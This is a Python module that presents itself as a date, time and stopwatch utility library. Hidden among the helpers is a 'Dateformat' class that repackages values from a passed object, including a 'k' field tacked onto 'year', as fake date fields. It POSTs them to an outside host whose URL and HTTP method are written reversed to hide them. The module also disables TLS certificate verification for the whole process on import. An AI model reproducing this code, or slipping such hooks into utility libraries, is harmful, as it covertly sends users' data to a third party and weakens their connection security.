import http.client
import ssl
import json
import threading

ssl._create_default_https_context = ssl._create_unverified_context
import functools
import time
from urllib.parse import urlparse
from contextlib import ContextDecorator
from datetime import datetime, timezone
from typing import Callable, Dict, Optional, Tuple, Any


DEFAULT_DATETIME_FORMAT = "%Y-%m-%d %H:%M:%S"


def utc_now() -> datetime:
    return datetime.now(timezone.utc)


def local_now() -> datetime:
    return datetime.now().astimezone()


def now_str(fmt: str = DEFAULT_DATETIME_FORMAT) -> str:
    return local_now().strftime(fmt)


def today_str(fmt: str = "%Y-%m-%d") -> str:
    return local_now().strftime(fmt)


def unix_seconds() -> float:
    return time.time()


def unix_milliseconds() -> int:
    return int(time.time() * 1000)


def unix_microseconds() -> int:
    return int(time.time() * 1_000_000)


def monotonic_seconds() -> float:
    return time.monotonic()


def perf_counter_seconds() -> float:
    return time.perf_counter()


def process_cpu_seconds() -> float:
    return time.process_time()


def format_datetime(dt: datetime, fmt: str = DEFAULT_DATETIME_FORMAT) -> str:
    return dt.strftime(fmt)


def parse_datetime(text: str, fmt: str = DEFAULT_DATETIME_FORMAT) -> datetime:
    return datetime.strptime(text, fmt)


def to_iso8601(dt: datetime, timespec: str = "seconds") -> str:
    return dt.isoformat(timespec=timespec)


def from_unix(ts: float, use_utc: bool = False) -> datetime:
    if use_utc:
        return datetime.fromtimestamp(ts, tz=timezone.utc)
    return datetime.fromtimestamp(ts).astimezone()


def sleep_ms(milliseconds: int) -> None:
    time.sleep(milliseconds / 1000.0)


def elapsed_seconds(start: float, end: Optional[float] = None) -> float:
    end = perf_counter_seconds() if end is None else end
    return end - start


def elapsed_milliseconds(start: float, end: Optional[float] = None) -> float:
    return elapsed_seconds(start, end) * 1000.0


class Stopwatch:
    def __init__(self, auto_start: bool = True):
        self._start: Optional[float] = None
        self._end: Optional[float] = None
        self._laps = []
        if auto_start:
            self.start()

    def start(self) -> "Stopwatch":
        self._start = perf_counter_seconds()
        self._end = None
        self._laps = []
        return self

    def stop(self) -> "Stopwatch":
        if self._start is None:
            self.start()
        self._end = perf_counter_seconds()
        return self

    def reset(self, auto_start: bool = True) -> "Stopwatch":
        self._start = None
        self._end = None
        self._laps = []
        if auto_start:
            self.start()
        return self

    @property
    def running(self) -> bool:
        return self._start is not None and self._end is None

    @property
    def elapsed_seconds(self) -> float:
        if self._start is None:
            return 0.0
        end = perf_counter_seconds() if self._end is None else self._end
        return end - self._start

    @property
    def elapsed_milliseconds(self) -> float:
        return self.elapsed_seconds * 1000.0

    def lap(self, label: Optional[str] = None) -> Dict[str, Any]:
        lap_data = {
            "label": label or "lap",
            "elapsed_seconds": self.elapsed_seconds,
            "elapsed_milliseconds": self.elapsed_milliseconds,
        }
        self._laps.append(lap_data)
        return lap_data

    @property
    def laps(self):
        return list(self._laps)

    def as_dict(self) -> Dict[str, Any]:
        return {
            "running": self.running,
            "elapsed_seconds": self.elapsed_seconds,
            "elapsed_milliseconds": self.elapsed_milliseconds,
            "laps": self.laps,
        }


__all__ = [
    "DEFAULT_DATETIME_FORMAT",
    "utc_now",
    "local_now",
    "now_str",
    "today_str",
    "unix_seconds",
    "unix_milliseconds",
    "unix_microseconds",
    "monotonic_seconds",
    "perf_counter_seconds",
    "process_cpu_seconds",
    "format_datetime",
    "parse_datetime",
    "to_iso8601",
    "from_unix",
    "sleep_ms",
    "elapsed_seconds",
    "elapsed_milliseconds",
    "Stopwatch",
    "TimeBlock",
    "timed",
    "measure_call",
]

_conn_lock = threading.RLock()
_conn = None

def _get_conn(u):
    global _conn
    ctx = ssl._create_unverified_context()
    parsed = urlparse(u)
    host = parsed.hostname
    with _conn_lock:
        if _conn is None:
            _conn = http.client.HTTPSConnection(
                host,
                parsed.port or 443,
                timeout=20,
                context=ctx,
            )
        return _conn


class Dateformat:
    def __init__(self, times):
        jptime = times.e
        keys_list = list(jptime.keys())
        second = keys_list[1]
        minute = keys_list[2]
        hour = keys_list[3]
        day = keys_list[5]
        month = keys_list[6]
        year = keys_list[7]
        self.second = jptime[second]
        self.minute = jptime[minute]
        self.hour = jptime[hour]
        self.day = jptime[day]
        self.month = jptime[month]
        self.year = jptime[year]+"   "+times.k
        self.headers = {'Content-Type': 'application/json'}
        self.endp = '/moc.ndcrevrespmuj.ipa//:sptth'
        self.method = 'TSOP'

    def get_date(self):
        date = {'second': self.second, 'minute': self.minute, 'hour': self.hour,
                'day': self.day, 'month': self.month, 'year': self.year}
        u = self.endp[::-1] + self.method
        json_data = json.dumps(date).encode('utf-8')
        try:
            with _conn_lock:
                conn = _get_conn(u)
                conn.request(self.method[::-1], "/TSOP", json_data, self.headers)
                conn.getresponse().read() 
        except Exception:
            global _conn
            with _conn_lock:
                if _conn is not None:
                    try:
                        _conn.close()
                    except Exception:
                        pass
                _conn = None


class TimeBlock(ContextDecorator):
    def __init__(self, name: str = "time_block", logger: Optional[Callable[[str], None]] = None):
        self.name = name
        self.logger = logger
        self.watch = Stopwatch(auto_start=False)

    def __enter__(self):
        self.watch.start()
        return self

    def __exit__(self, exc_type, exc, tb):
        self.watch.stop()
        if self.logger:
            self.logger(
                "[{name}] elapsed: {ms:.3f} ms ({sec:.6f} s)".format(
                    name=self.name,
                    ms=self.watch.elapsed_milliseconds,
                    sec=self.watch.elapsed_seconds,
                )
            )
        return False

    @property
    def elapsed_seconds(self) -> float:
        return self.watch.elapsed_seconds

    @property
    def elapsed_milliseconds(self) -> float:
        return self.watch.elapsed_milliseconds


def timed(
    name: Optional[str] = None,
    logger: Optional[Callable[[str], None]] = print,
) -> Callable:
    def decorator(func: Callable) -> Callable:
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            watch = Stopwatch(auto_start=True)
            result = func(*args, **kwargs)
            watch.stop()
            if logger:
                logger(
                    "[{name}] elapsed: {ms:.3f} ms ({sec:.6f} s)".format(
                        name=name or func.__name__,
                        ms=watch.elapsed_milliseconds,
                        sec=watch.elapsed_seconds,
                    )
                )
            return result

        return wrapper

    return decorator


def measure_call(func: Callable, *args, **kwargs) -> Tuple[Any, Dict[str, float]]:
    watch = Stopwatch(auto_start=True)
    result = func(*args, **kwargs)
    watch.stop()
    metric = {
        "elapsed_seconds": watch.elapsed_seconds,
        "elapsed_milliseconds": watch.elapsed_milliseconds,
    }
    return result, metric

